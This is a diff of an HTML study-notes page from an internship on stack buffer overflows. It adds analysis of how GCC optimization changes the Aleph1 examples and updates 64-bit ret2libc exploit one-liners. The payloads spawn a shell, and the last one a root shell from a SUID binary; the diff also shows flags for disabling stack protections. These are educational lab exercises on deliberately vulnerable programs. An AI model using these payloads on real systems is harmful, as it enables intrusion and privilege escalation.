@@ -53,7 +53,7 @@ SOFTWARE.
   <meta name="generator" content="pandoc" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
   <meta name="author" content="Florian Hofhammer" />
-  <meta name="dcterms.date" content="2020-04-27" />
+  <meta name="dcterms.date" content="2020-04-28" />
   <title>Notes for the Stack Buffer Overflow internship at INRIA Sophia</title>
   <style type="text/css">
 @charset "UTF-8";.markdown-body{text-align:justify;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";font-size:16px;line-height:1.5;word-wrap:break-word;box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto;padding:45px}.markdown-body a{color:#0366d6;background-color:transparent;text-decoration:none;-webkit-text-decoration-skip:objects}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body a:hover{text-decoration:underline}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body strong{font-weight:600}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em;margin:.67em 0;padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{padding-bottom:.3em;font-size:1.5em;border-bottom:1px solid #eaecef}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body img{border-style:none}.markdown-body svg:not(:root){overflow:hidden}.markdown-body hr{box-sizing:content-box;height:.25em;margin:24px 0;padding:0;overflow:hidden;background-color:#e1e4e8;border:0}.markdown-body hr::before{display:table;content:""}.markdown-body hr::after{display:table;clear:both;content:""}.markdown-body input{margin:0;overflow:visible;font:inherit;font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body li>p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dd{margin-left:0}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body code{font-family:SFMono-Regular,Consolas,"Liberation Mono",Menlo,Courier,monospace}.markdown-body pre{font:12px SFMono-Regular,Consolas,"Liberation Mono",Menlo,Courier,monospace;word-wrap:normal}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body table{display:block;width:100%;overflow:auto;border-spacing:0;border-collapse:collapse}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body code{padding:.2em 0;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code::after,.markdown-body code::before{letter-spacing:-.2em;content:" "}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:0 0;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code::after,.markdown-body pre code::before{content:normal}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body kbd{box-shadow:inset 0 -1px 0 #959da5;display:inline-block;padding:3px 5px;font:11px/10px SFMono-Regular,Consolas,"Liberation Mono",Menlo,Courier,monospace;color:#444d56;vertical-align:middle;background-color:#fcfcfc;border:1px solid #c6cbd1;border-bottom-color:#959da5;border-radius:3px;box-shadow:inset 0 -1px 0 #959da5}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}.markdown-body::before{display:table;content:""}.markdown-body::after{display:table;clear:both;content:""}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.Alert,.Error,.Note,.Success,.Warning{padding:11px;margin-bottom:24px;border-style:solid;border-width:1px;border-radius:4px}.Alert p,.Error p,.Note p,.Success p,.Warning p{margin-top:0}.Alert p:last-child,.Error p:last-child,.Note p:last-child,.Success p:last-child,.Warning p:last-child{margin-bottom:0}.Alert{color:#246;background-color:#e2eef9;border-color:#bac6d3}.Warning{color:#4c4a42;background-color:#fff9ea;border-color:#dfd8c2}.Error{color:#911;background-color:#fcdede;border-color:#d2b2b2}.Success{color:#22662c;background-color:#e2f9e5;border-color:#bad3be}.Note{color:#2f363d;background-color:#f6f8fa;border-color:#d5d8da}.Alert h1,.Alert h2,.Alert h3,.Alert h4,.Alert h5,.Alert h6{color:#246;margin-bottom:0}.Warning h1,.Warning h2,.Warning h3,.Warning h4,.Warning h5,.Warning h6{color:#4c4a42;margin-bottom:0}.Error h1,.Error h2,.Error h3,.Error h4,.Error h5,.Error h6{color:#911;margin-bottom:0}.Success h1,.Success h2,.Success h3,.Success h4,.Success h5,.Success h6{color:#22662c;margin-bottom:0}.Note h1,.Note h2,.Note h3,.Note h4,.Note h5,.Note h6{color:#2f363d;margin-bottom:0}.Alert h1:first-child,.Alert h2:first-child,.Alert h3:first-child,.Alert h4:first-child,.Alert h5:first-child,.Alert h6:first-child,.Error h1:first-child,.Error h2:first-child,.Error h3:first-child,.Error h4:first-child,.Error h5:first-child,.Error h6:first-child,.Note h1:first-child,.Note h2:first-child,.Note h3:first-child,.Note h4:first-child,.Note h5:first-child,.Note h6:first-child,.Success h1:first-child,.Success h2:first-child,.Success h3:first-child,.Success h4:first-child,.Success h5:first-child,.Success h6:first-child,.Warning h1:first-child,.Warning h2:first-child,.Warning h3:first-child,.Warning h4:first-child,.Warning h5:first-child,.Warning h6:first-child{margin-top:0}h1.title,p.subtitle{text-align:center}h1.title.followed-by-subtitle{margin-bottom:0}p.subtitle{font-size:1.5em;font-weight:600;line-height:1.25;margin-top:0;margin-bottom:16px;padding-bottom:.3em}div.line-block{white-space:pre-line}
@@ -131,7 +131,7 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
 <header>
 <h1 class="title">Notes for the Stack Buffer Overflow internship at INRIA Sophia</h1>
 <p class="author">Florian Hofhammer</p>
-<p class="date">2020-04-27</p>
+<p class="date">2020-04-28</p>
 </header>
 <hr>
 <nav id="TOC">
@@ -146,11 +146,13 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
 <li><a href="#example3.c">example3.c</a></li>
 <li><a href="#overflow1.c">overflow1.c</a></li>
 <li><a href="#vulnerable.c">vulnerable.c</a></li>
+<li><a href="#optimized-compilation">Optimized compilation</a></li>
 </ul></li>
 <li><a href="#bit-linux-stack-smashing">64-bit Linux stack smashing</a><ul>
 <li><a href="#part-1">Part 1</a></li>
 <li><a href="#part-2">Part 2</a></li>
 <li><a href="#part-3">Part 3</a></li>
+<li><a href="#optimized-compilation-1">Optimized compilation</a></li>
 </ul></li>
 <li><a href="#aslr-smack-and-laugh">ASLR Smack and Laugh</a><ul>
 <li><a href="#general-observations">General observations</a></li>
@@ -194,7 +196,7 @@ As they are based on the GDB Python API and partly still use Python 2.7 (which b
 <p>Other useful installed tools include <code>ropper</code> and <code>ROPgadget</code> which make it easier to find gadgets for return-oriented programming (ROP). Those were installed with <code>pip3 install ropper ropgadget</code>. For further information, see the GitHub repositories for <a href="https://github.com/sashs/Ropper">ropper</a> and <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>.</p>
 <p>All of those tools and installation steps are fully optional, the exploits work without those just fine. However, they can greatly reduce the time to find bugs and improve the exploit development process.</p>
 <h1 id="smashing-the-stack-for-fun-and-profit---aleph1">Smashing the Stack for fun and profit - Aleph1</h1>
-<p>As a starting exercise, I am trying to recreate the examples and exploits from the <a href="http://phrack.org/issues/49/14.html#article">original paper</a>. The compiler flags for <code>gcc</code> generally used are <code>-m32 -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0</code> (see e.g. the <a href="./Makefile.common">common Makefile</a> and the <a href="./Smashing%20the%20stack%20-%20Aleph1/Makefile">directory specific Makefile</a>). Without those, current stack overflow mitigation measures do not allow to successfully overflow the buffers on the stack as described in the paper.</p>
+<p>As a starting exercise, I am trying to recreate the examples and exploits from the <a href="http://phrack.org/issues/49/14.html#article">original paper</a>. The compiler / linker flags for <code>gcc</code> generally used are <code>-m32 -fno-stack-protector -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 -g -z execstack</code> (see e.g. the <a href="./Makefile.common">common Makefile</a> and the <a href="./Smashing%20the%20stack%20-%20Aleph1/Makefile">directory specific Makefile</a>). Without those, current stack overflow mitigation measures do not allow to successfully overflow the buffers on the stack as described in the paper.</p>
 <h2 id="example3.c">example3.c</h2>
 <p>The executable only provided a segfault because the return address was incorrectly overwritten (checked with <code>gdb</code>). In order to correctly overwrite the return address, it is necessary to change the offset from <code>buffer1</code> from <code>12</code> to <code>13</code>, as the offset was off by one byte.</p>
 <h2 id="overflow1.c">overflow1.c</h2>
@@ -232,6 +234,118 @@ As they are based on the GDB Python API and partly still use Python 2.7 (which b
 <p>Changing the comparison from <code>i &lt;= eggsize ...</code> to <code>i &lt; eggsize ...</code> fixes that problem, as one less NOP instruction is written to the egg buffer and thus the actual shellcode starts at a lower position in the buffer.</p>
 <p>Providing no offset as with <code>exploit4</code>, the address in <code>BOF</code> does not point to the <code>EGG</code> environment variable. Just like with <code>exploit3</code>, it is easy to find a fitting offset with a debugger by looking at the difference of the provided (incorrect) address and the address of the <code>EGG</code> variable (e.g. by issuing <code>search &quot;EGG&quot;</code> in <code>gdb</code> with the <code>pwndbg</code> plugin). Thus, calling e.g. <code>eggshell -b 600 -o -2000</code> lets us spawn a shell from the <code>vulnerable</code> executable.</p>
 <p>Additionally, appending the <code>-s</code> flag to the <code>eggshell</code> call uses a different shellcode which not only spawns a shell but also calls <code>setreuid(geteuid(), geteuid())</code> before. With this addition, it is not only possible to spawn a shell at all, but also to spawn a shell with the executable’s owner’s privileges if the SUID bit on the executable is set. If the owner is set to <code>root</code> and the SUID bit is set (e.g. by executing <code>sudo chown root vulnerable &amp;&amp; sudo chmod u+s vulnerable</code>), it is thus possible to spawn a root shell even when executing the exploit as a non-privileged user.</p>
+<h2 id="optimized-compilation">Optimized compilation</h2>
+<p>The results described in the previous sections were achieved without any compiler optimizations enabled. If compiling with the highest optimizations in GCC (i.e. the <code>-O3</code> flag), the results are a little bit different.</p>
+<h3 id="example2.c">example2.c</h3>
+<p>If we look for example at <a href="./Smashing%20the%20stack%20-%20Aleph1/example2.c">example2.c</a>, we can immediately spot the vulnerability: In the function <code>function</code>, we copy the string the function receives into a 16 bytes buffer, no matter how big the string is. Without optimizations, this leads to a segmentation fault, as the given string (i.e. 255 * ‘A’) is way to big for the buffer and overflows the return address. With optimizations enabled, the function is completely inlined, i.e. the space for <code>buffer</code> is already allocated on the stack in the main function and instead of calling <code>function</code>, <code>main</code> just calls <code>strcpy</code> itself with the correct parameters, i.e. the addresses of <code>buffer</code> and <code>large_string</code>.<br />
+Because of how the stack is organized in this case, we don’t get a segmentation fault as we expected. This is because the <code>buffer</code> array resides on the stack directly after the <code>large_string</code> array (i.e. with a lower address) (see explanatory figures below). Thus, instead of overwriting the return address, there is coincidentally enough space on the stack to overwrite without harming the saved frame pointer or the return address and the <code>strcpy</code> call overwrites the start of <code>large_string</code> instead of control flow information on the stack. Technically, this is still considered a buffer overflow even though it makes no harm in this particular case.</p>
+<p>Stack without optimization (each row corresponds to 4 bytes):</p>
+<pre><code>higher address |                             |
+               +-----------------------------+  ---+
+               | return address (main)       |     |
+               +-----------------------------+     |
+               | saved frame ptr (main)      |     |
+               +-----------------------------+     |
+               | i                           |     +--- stack frame of main
+               +-----------------------------+     |
+               | large_string[255 - 252]     |     |
+               | large_string[251 - 248]     |     |
+               |           ...               |     |
+               | large_string[3 - 0]         |     |
+               +-----------------------------+  ---+
+               | return address (function)   |  ---+
+               +-----------------------------+     |
+               | saved frame ptr (function)  |     |
+               +-----------------------------+     |
+               | buffer[15 - 12]             |     +--- stack frame of function
+               | buffer[11 - 8]              |     |
+               | buffer[7 - 4]               |     |
+               | buffer[3 - 0]               |     |
+               +-----------------------------+  ---+
+lower address  |                             |
+</code></pre>
+<p>Stack with optimization (each row corresponds to 4 bytes):</p>
+<pre><code>higher address |                             |
+               +-----------------------------+  ---+
+               | return address (main)       |     |
+               +-----------------------------+     |
+               | saved frame ptr (main)      |     |
+               +-----------------------------+     |
+               | large_string[255 - 252]     |     |
+               | large_string[251 - 248]     |     |
+               |           ...               |     +--- stack frame of main
+               | large_string[3 - 0]         |     |
+               +-----------------------------+     |
+               | buffer[15 - 12]             |     |
+               | buffer[11 - 8]              |     |
+               | buffer[7 - 4]               |     |
+               | buffer[3 - 0]               |     |
+               +-----------------------------+  ---+
+lower address  |                             |
+</code></pre>
+<h3 id="example3.c-1">example3.c</h3>
+<p>With <a href="./Smashing%20the%20stack%20-%20Aleph1/example3.c">example3.c</a>, the code also does not do what we expect, namely output <code>0</code> because we overwrote the return pointer of <code>function</code> in a way so that the <code>x = 1;</code> assignment is omitted. Here, the reason for this behavior is not inlining a function as we had previously but completely omitting a function.</p>
+<p>When disassembling the corresponding executable, we can see that the function <code>function</code> simply is completely omitted from the compiler output. This is because of four reasons:</p>
+<ol type="1">
+<li>The function’s argument policy is “call-by-value” and not “call-by-reference”, i.e. the function just receives values from the caller but does not tamper with the caller’s memory by e.g. getting some pointers to manipulate.</li>
+<li>The function has no return value (<code>void</code>) that would be saved in the caller’s function and reused.</li>
+<li>The function does not access any global or otherwise somehow shared variables.</li>
+<li>The function does not call any other functions which might influence the result / behavior (e.g. <code>printf</code>, <code>memset</code>, etc.).</li>
+</ol>
+<p>Because of those four reasons, the result of the compiler analysis is that this function does not have any functionality that influences the result (whereas it has: overwriting the return pointer). Thus, the compiler completely omits this function.</p>
+<p>Therefore, the code is compiled in such a way that it simply outputs <code>1</code> via <code>printf</code> with a value <code>x = 1</code>.</p>
+<h3 id="testsc.c-and-testsc2.c">testsc.c and testsc2.c</h3>
+<p>The behavior of <a href="./Smashing%20the%20stack%20-%20Aleph1/testsc.c">testsc.c</a> and <a href="./Smashing%20the%20stack%20-%20Aleph1/testsc2.c">testsc2.c</a> is exactly the same when compiled with optimizations and is similar to the behavior of <code>example3</code> as described above.</p>
+<p>GCC determines that the assignments (address of return address to <code>ret</code>, shellcode address to <code>*ret</code>) do not influence the further program flow (whereas they do, they overwrite the return pointer). Thus, they can be omitted according to the compiler. Because of this behavior, the compiler output for the corresponding optimized main functions is</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode asm"><code class="sourceCode fasm"><a class="sourceLine" id="cb6-1" data-line-number="1">endbr32</a>
+<a class="sourceLine" id="cb6-2" data-line-number="2"><span class="bu">ret</span></a></code></pre></div>
+<p>instead of</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode asm"><code class="sourceCode fasm"><a class="sourceLine" id="cb7-1" data-line-number="1">endbr32</a>
+<a class="sourceLine" id="cb7-2" data-line-number="2"><span class="bu">push</span>   %<span class="kw">ebp</span></a>
+<a class="sourceLine" id="cb7-3" data-line-number="3"><span class="bu">mov</span>    %<span class="kw">esp</span>,%<span class="kw">ebp</span></a>
+<a class="sourceLine" id="cb7-4" data-line-number="4"><span class="bu">sub</span>    <span class="dv">$</span><span class="bn">0x4,</span>%<span class="kw">esp</span></a>
+<a class="sourceLine" id="cb7-5" data-line-number="5"><span class="bu">call</span>   11a9 &lt;__x86.get_pc_thunk.<span class="kw">dx</span>&gt;</a>
+<a class="sourceLine" id="cb7-6" data-line-number="6"><span class="bu">add</span>    <span class="dv">$</span><span class="bn">0x2e20,</span>%<span class="kw">edx</span></a>
+<a class="sourceLine" id="cb7-7" data-line-number="7"><span class="bu">lea</span>    <span class="bn">-0x4</span>(%<span class="kw">ebp</span>),%<span class="kw">eax</span>     # <span class="bu">load</span> address of <span class="bu">ret</span></a>
+<a class="sourceLine" id="cb7-8" data-line-number="8"><span class="bu">add</span>    <span class="dv">$</span><span class="bn">0x8,</span>%<span class="kw">eax</span>           # increment address by <span class="dv">8</span> bytes = <span class="dv">2</span> words (<span class="dv">32</span> bits each)</a>
+<a class="sourceLine" id="cb7-9" data-line-number="9"><span class="bu">mov</span>    %<span class="kw">eax</span>,-<span class="bn">0x4</span>(%<span class="kw">ebp</span>)     # save new address of <span class="bu">ret</span> to <span class="bu">ret</span></a>
+<a class="sourceLine" id="cb7-10" data-line-number="10"><span class="bu">mov</span>    <span class="bn">-0x4</span>(%<span class="kw">ebp</span>),%<span class="kw">eax</span>     # <span class="bu">load</span> <span class="bu">ret</span></a>
+<a class="sourceLine" id="cb7-11" data-line-number="11"><span class="bu">lea</span>    <span class="bn">0x44</span>(%<span class="kw">edx</span>),%<span class="kw">edx</span>     # <span class="bu">load</span> address of shellcode</a>
+<a class="sourceLine" id="cb7-12" data-line-number="12"><span class="bu">mov</span>    %<span class="kw">edx</span>,(%<span class="kw">eax</span>)         # save address of shellcode to <span class="bu">ret</span></a>
+<a class="sourceLine" id="cb7-13" data-line-number="13"><span class="bu">nop</span></a>
+<a class="sourceLine" id="cb7-14" data-line-number="14"><span class="bu">leave</span></a>
+<a class="sourceLine" id="cb7-15" data-line-number="15"><span class="bu">ret</span></a></code></pre></div>
+<p>(comments added for better readability).</p>
+<p>The optimized <code>main</code> thus does only one thing: immediately return without any action.</p>
+<p>Changing the main function from</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb8-1" data-line-number="1"><span class="dt">void</span> main() {</a>
+<a class="sourceLine" id="cb8-2" data-line-number="2">    <span class="dt">int</span> *ret;</a>
+<a class="sourceLine" id="cb8-3" data-line-number="3">    ret = (<span class="dt">int</span> *)&amp;ret + <span class="dv">2</span>;</a>
+<a class="sourceLine" id="cb8-4" data-line-number="4">    (*ret) = (<span class="dt">int</span>)shellcode;</a>
+<a class="sourceLine" id="cb8-5" data-line-number="5">}</a></code></pre></div>
+<p>to</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb9-1" data-line-number="1"><span class="dt">void</span> main() {</a>
+<a class="sourceLine" id="cb9-2" data-line-number="2">    <span class="dt">int</span> *ret;</a>
+<a class="sourceLine" id="cb9-3" data-line-number="3">    ret = (<span class="dt">int</span> *)&amp;ret + <span class="dv">2</span>;</a>
+<a class="sourceLine" id="cb9-4" data-line-number="4">    (*ret) = (<span class="dt">int</span>)shellcode;</a>
+<a class="sourceLine" id="cb9-5" data-line-number="5">    printf(<span class="st">&quot;ret: %p</span><span class="sc">\n</span><span class="st">&quot;</span>, ret);</a>
+<a class="sourceLine" id="cb9-6" data-line-number="6">}</a></code></pre></div>
+<p>forces the compiler to include the calculations and assignments concerning <code>ret</code> in the compiler output, as <code>ret</code> is explicitely referenced in an output to the console.</p>
+<h3 id="exploits">Exploits</h3>
+<p>Concerning the exploits (<code>overflow1</code>, <code>exploit2</code>, <code>exploit3</code>, <code>exploit4</code>, <code>eggshell</code>), there is not a huge difference whether the code is optimized or not.</p>
+<p>One change that is necessary is to explicitly return the stack pointer address from the <code>get_sp</code> functions instead of just copying it to the <code>eax</code> register and assuming that this register is used for the return value. Because of the optimizations, GCC may inline the <code>get_sp</code> function and not realize that the value in <code>eax</code> is important and just discard it. Thus, a change from</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb10-1" data-line-number="1"><span class="dt">unsigned</span> <span class="dt">long</span> get_sp(<span class="dt">void</span>) {</a>
+<a class="sourceLine" id="cb10-2" data-line-number="2">    asm(<span class="st">&quot;movl %esp,%eax&quot;</span>);</a>
+<a class="sourceLine" id="cb10-3" data-line-number="3">}</a></code></pre></div>
+<p>to</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb11-1" data-line-number="1"><span class="dt">unsigned</span> <span class="dt">long</span> get_sp(<span class="dt">void</span>) {</a>
+<a class="sourceLine" id="cb11-2" data-line-number="2">    <span class="dt">unsigned</span> <span class="dt">long</span> result;</a>
+<a class="sourceLine" id="cb11-3" data-line-number="3">    asm(<span class="st">&quot;movl %%esp,%0&quot;</span></a>
+<a class="sourceLine" id="cb11-4" data-line-number="4">        : <span class="st">&quot;=g&quot;</span>(result));</a>
+<a class="sourceLine" id="cb11-5" data-line-number="5">    <span class="cf">return</span> result;</a>
+<a class="sourceLine" id="cb11-6" data-line-number="6">}</a></code></pre></div>
+<p>solves the problem by switching from <code>basic asm</code> notation to <code>extended asm</code> notation (see <a href="https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html">GCC documentation</a>), as the stack pointer address is now explicitely saved to a variable and returned. Both versions have exactly the same output for <code>get_sp</code> (if compiled with optimizations) but the latter one forces GCC to really use the returned value in <code>eax</code> and not discard it.</p>
+<p>With this change made, the non-optimized exploits still work as described in the above sections. For the optimized exploits, it is sufficient to change the offsets for <code>exploit2</code> (<code>1676</code> instead of <code>1660</code>) and <code>exploit3</code> (<code>1600</code> instead of <code>350</code>), the other exploits (namely: <code>overflow1</code>, <code>exploit4</code>, <code>eggshell</code>) still work as expected.</p>
 <h1 id="bit-linux-stack-smashing">64-bit Linux stack smashing</h1>
 <p>This tutorial found on <a href="https://blog.techorganic.com" class="uri">https://blog.techorganic.com</a> is about exploiting stack buffer overflows on 64 bit machines and consists of three parts.</p>
 <h2 id="part-1">Part 1</h2>
@@ -248,36 +362,36 @@ In this attack, the return address is overwritten such that the program jumps to
 <li>Combine the addresses and run it</li>
 </ol>
 <p>The code is then the following (<code>cat</code> is necessary for keeping the shell open):</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb4-1" data-line-number="1"><span class="kw">(</span><span class="ex">python3</span> -c <span class="st">&quot;from struct import pack; import sys; sys.stdout.buffer.write(</span></a>
-<a class="sourceLine" id="cb4-2" data-line-number="2"><span class="st">    b'A' * 104 +                        # Padding to reach the return address</span></a>
-<a class="sourceLine" id="cb4-3" data-line-number="3"><span class="st">    pack('&lt;Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init</span></a>
-<a class="sourceLine" id="cb4-4" data-line-number="4"><span class="st">    pack('&lt;Q', 0x000055555555603f) +    # Address of &quot;</span>/bin/sh<span class="st">&quot; in function main</span></a>
-<a class="sourceLine" id="cb4-5" data-line-number="5"><span class="st">    pack('&lt;Q', 0x00007ffff7e18410)      # Address of function system</span></a>
-<a class="sourceLine" id="cb4-6" data-line-number="6"><span class="st">    )&quot;</span><span class="kw">;</span> <span class="fu">cat</span><span class="kw">)</span> <span class="kw">|</span> <span class="ex">./vulnerable</span></a></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb12-1" data-line-number="1"><span class="kw">(</span><span class="ex">python3</span> -c <span class="st">&quot;from struct import pack; import sys; sys.stdout.buffer.write(</span></a>
+<a class="sourceLine" id="cb12-2" data-line-number="2"><span class="st">    b'A' * 104 +                        # Padding to reach the return address</span></a>
+<a class="sourceLine" id="cb12-3" data-line-number="3"><span class="st">    pack('&lt;Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init</span></a>
+<a class="sourceLine" id="cb12-4" data-line-number="4"><span class="st">    pack('&lt;Q', 0x000055555555603f) +    # Address of &quot;</span>/bin/sh<span class="st">&quot; in function main</span></a>
+<a class="sourceLine" id="cb12-5" data-line-number="5"><span class="st">    pack('&lt;Q', 0x00007ffff7e18410)      # Address of function system</span></a>
+<a class="sourceLine" id="cb12-6" data-line-number="6"><span class="st">    )&quot;</span><span class="kw">;</span> <span class="fu">cat</span><span class="kw">)</span> <span class="kw">|</span> <span class="ex">./vulnerable</span></a></code></pre></div>
 <p>Unfortunately, this only yields a segmentation fault. After investigating by debugging, it can be found that the segfault occurs during the <code>movaps xmmword ptr [rsp + 0x50], xmm0</code> instruction in <code>do_system</code>. The segfault occurs because the stack pointer (here included by <code>rsp</code>) is not properly aligned. <code>movaps</code> requires the memory address to be aligned on 16 bytes (see <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf#page=701">Intel instruction set reference</a>). When the segfault occurs, the <code>rsp</code> register contains the value <code>0x7fffffffdeb8</code>, which obviously is not aligned to 16 bytes (last hex digit has to be <code>0</code>). By extending our data to be copied onto the stack by 8 bytes, we can achieve proper alignment.<br />
 As 64 bit addresses are exactly 8 bytes, the easiest way to achieve that is by adding an address to the stack that doesn’t change our execution. This could be the address of a <code>ret</code> instruction before our <code>pop rdi; ret</code> gadget. Such an instruction has no effect: when we return to this instruction, it immediately returns to the next instruction which is our exploit code.</p>
 <p>Thus, a fixed version of the code is as follows:</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb5-1" data-line-number="1"><span class="kw">(</span><span class="ex">python3</span> -c <span class="st">&quot;from struct import pack; import sys; sys.stdout.buffer.write(</span></a>
-<a class="sourceLine" id="cb5-2" data-line-number="2"><span class="st">    b'A' * 104 +                        # Padding to reach the return address</span></a>
-<a class="sourceLine" id="cb5-3" data-line-number="3"><span class="st">    pack('&lt;Q', 0x00005555555551da) +    # Address of ret in function vuln</span></a>
-<a class="sourceLine" id="cb5-4" data-line-number="4"><span class="st">    pack('&lt;Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init</span></a>
-<a class="sourceLine" id="cb5-5" data-line-number="5"><span class="st">    pack('&lt;Q', 0x000055555555603f) +    # Address of &quot;</span>/bin/sh<span class="st">&quot; in function main</span></a>
-<a class="sourceLine" id="cb5-6" data-line-number="6"><span class="st">    pack('&lt;Q', 0x00007ffff7e18410)      # Address of function system</span></a>
-<a class="sourceLine" id="cb5-7" data-line-number="7"><span class="st">    )&quot;</span><span class="kw">;</span> <span class="fu">cat</span><span class="kw">)</span> <span class="kw">|</span> <span class="ex">./vulnerable</span></a></code></pre></div>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb13-1" data-line-number="1"><span class="kw">(</span><span class="ex">python3</span> -c <span class="st">&quot;from struct import pack; import sys; sys.stdout.buffer.write(</span></a>
+<a class="sourceLine" id="cb13-2" data-line-number="2"><span class="st">    b'A' * 104 +                        # Padding to reach the return address</span></a>
+<a class="sourceLine" id="cb13-3" data-line-number="3"><span class="st">    pack('&lt;Q', 0x00005555555551da) +    # Address of ret in function vuln</span></a>
+<a class="sourceLine" id="cb13-4" data-line-number="4"><span class="st">    pack('&lt;Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init</span></a>
+<a class="sourceLine" id="cb13-5" data-line-number="5"><span class="st">    pack('&lt;Q', 0x000055555555603f) +    # Address of &quot;</span>/bin/sh<span class="st">&quot; in function main</span></a>
+<a class="sourceLine" id="cb13-6" data-line-number="6"><span class="st">    pack('&lt;Q', 0x00007ffff7e18410)      # Address of function system</span></a>
+<a class="sourceLine" id="cb13-7" data-line-number="7"><span class="st">    )&quot;</span><span class="kw">;</span> <span class="fu">cat</span><span class="kw">)</span> <span class="kw">|</span> <span class="ex">./vulnerable</span></a></code></pre></div>
 <p>If the SUID bit is set on the executable and it is owned by root, we can spawn a root shell with the following code:</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb6-1" data-line-number="1"><span class="kw">(</span><span class="ex">python3</span> -c <span class="st">&quot;from struct import pack; import sys; sys.stdout.buffer.write(</span></a>
-<a class="sourceLine" id="cb6-2" data-line-number="2"><span class="st">    b'A' * 104 +                        # Padding to reach the return address</span></a>
-<a class="sourceLine" id="cb6-3" data-line-number="3"><span class="st">    pack('&lt;Q', 0x00005555555551da) +    # Address of ret in function vuln</span></a>
-<a class="sourceLine" id="cb6-4" data-line-number="4"><span class="st">    pack('&lt;Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init</span></a>
-<a class="sourceLine" id="cb6-5" data-line-number="5"><span class="st">    pack('&lt;Q', 0x0000000000000000) +    # Value 0 =&gt; uid of root</span></a>
